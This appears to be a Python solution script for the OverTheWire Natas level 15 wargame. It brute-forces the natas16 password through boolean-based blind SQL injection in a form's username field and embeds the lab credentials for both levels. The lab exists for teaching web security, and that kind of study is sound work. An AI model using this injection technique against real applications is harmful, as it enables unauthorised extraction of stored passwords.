import string,requests

url="http://natas15.natas.labs.overthewire.org"
auth_username="natas15"
auth_password="TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB"


brute=''.join([string.ascii_letters,string.digits])
password=[]
print(brute)


def main():
	for i in range(1,33):
		for ele in brute:
			payload='"'+f" or (select BINARY  substring(password,{str(i)},1) from users where"+f" username='natas16')='{str(ele)}'#"
			print(payload)
			#payload='"'+ "or select username from users where username='natas16'"+ f"and SUBSTR(password,{str(i)},1)='{str(ele)}'#"
			params={'username':payload,'submit':'Check existence'}
			r=requests.post(url,auth=(auth_username,auth_password),data=params)
			if 'This user exists.' in r.text:
				password.append(ele)
				print(f"at {str(i)}: {''.join(password)}")
				break


if __name__=='__main__':
	main()

#user pass for natas16 - TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V